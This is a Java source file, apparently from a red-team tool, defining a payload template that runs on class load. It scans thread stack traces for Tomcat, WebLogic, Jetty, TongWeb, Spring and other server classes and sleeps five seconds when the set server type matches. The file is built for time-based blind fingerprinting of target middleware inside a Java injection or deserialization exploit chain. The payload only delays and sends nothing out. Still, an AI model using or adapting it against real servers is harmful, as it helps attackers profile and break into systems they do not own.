package com.potato.potatotool.content.redTeam.payload.detector.templates;

import java.util.Map;

public class SleepDetectorTemplate {
    static {
        new SleepDetectorTemplate();
    }

    public SleepDetectorTemplate() {
        initServerType();
    }

    public static String getServerType() {
        return "tomcat";
    }

    private static void execSleep() {
        try {
            Thread.sleep(5000L);
        } catch (Exception ignored) {
        }
    }

    public static void initServerType() {
        String targetServerType = getServerType();
        Map<Thread, StackTraceElement[]> stackTraces = Thread.getAllStackTraces();
        for (Map.Entry<Thread, StackTraceElement[]> entry : stackTraces.entrySet()) {
            StackTraceElement[] stackTraceElements = entry.getValue();
            for (int i = 0; i < stackTraceElements.length; i++) {
                String className = stackTraceElements[i].getClassName();
                if (targetServerType.equals("tomcat") && className.contains("org.apache.catalina.core")) {
                    execSleep();
                    return;
                }
                if (targetServerType.equals("weblogic") && className.contains("weblogic.servlet.internal")) {
                    execSleep();
                    return;
                }
                if (targetServerType.equals("resin") && className.contains("com.caucho.server")) {
                    execSleep();
                    return;
                }
                if (targetServerType.equals("jetty") && className.contains("org.eclipse.jetty.server")) {
                    execSleep();
                    return;
                }
                if (targetServerType.equals("websphere") && className.contains("com.ibm.ws")) {
                    execSleep();
                    return;
                }
                if (targetServerType.equals("undertow") && className.contains("io.undertow.server")) {
                    execSleep();
                    return;
                }
                if (targetServerType.equals("tongweb") && className.contains("com.tongweb.web")) {
                    execSleep();
                    return;
                }
                if (targetServerType.equals("apusic") && className.contains("com.apusic.web")) {
                    execSleep();
                    return;
                }
                if (targetServerType.equals("spring") && className.contains("org.springframework.web")) {
                    execSleep();
                    return;
                }
            }
        }
    }
}
